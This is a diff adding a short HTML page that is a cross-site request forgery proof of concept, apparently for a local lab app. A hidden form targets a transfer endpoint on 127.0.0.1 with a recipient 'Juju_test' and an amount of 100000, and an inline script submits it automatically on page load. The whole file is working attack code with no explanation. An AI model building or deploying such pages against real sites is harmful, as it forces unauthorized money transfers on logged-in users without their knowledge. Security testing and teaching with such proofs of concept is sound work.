@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form id="csrf" action="http://127.0.0.1:8080/transfer" method="POST">
+      <input type="hidden" name="user_to" value="Juju_test">
+      <input type="hidden" name="amount" value="100000">
+    </form>
+    <script>
+      document.getElementById('csrf').submit();
+    </script>
+  </body>
+</html>
